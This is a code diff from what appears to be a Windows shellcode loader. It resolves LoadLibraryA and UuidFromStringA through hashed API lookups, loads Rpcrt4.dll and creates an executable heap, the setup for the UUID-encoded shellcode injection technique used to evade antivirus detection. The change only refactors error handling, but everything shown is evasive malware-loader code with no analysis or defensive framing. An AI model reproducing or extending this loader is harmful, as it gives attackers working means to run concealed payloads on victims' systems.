@@ -24,6 +24,7 @@ LL fLoadLibraryA;
 
 int main()
 {
+	// Get LoadLibraryA
     fLoadLibraryA = (LL)GetProcAddressWithHash(0x0726774C);
 	if (!fLoadLibraryA)
 	{
@@ -31,27 +32,27 @@ int main()
         printf("[-] Unable to get proc address: LoadLibraryA\n");
 #endif		
 	}
-	
+
+	// Load Rpcrt4.dll
     HMODULE rpcrt4Dll = fLoadLibraryA("Rpcrt4.dll");
-    if (rpcrt4Dll)
+    if (!rpcrt4Dll)
     {
-        fUuidFromStringA = (UA)GetProcAddressWithHash(0xA483218A);
-        if (!fUuidFromStringA)
-        {
-#ifdef _DEBUG
-            printf("[-] Unable to get proc address: UuidFromStringA\n");
-#endif
-        	return -1;
-        }  
-    }
-	else
-	{
 #ifdef _DEBUG
         printf("[-] Unable to load library: Rpcrt4.dll\n");
 #endif
-        return -1;
-	}
-   
+	    return -1;
+    }
+
+	// Get UuidFromStringA
+	fUuidFromStringA = (UA)GetProcAddressWithHash(0xA483218A);
+	if (!fUuidFromStringA)
+	{
+#ifdef _DEBUG
+        printf("[-] Unable to get proc address: UuidFromStringA\n");
+#endif
+		return -1;
+	}  
+	   
 	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
     void* ha = nullptr;
 	if (hc)
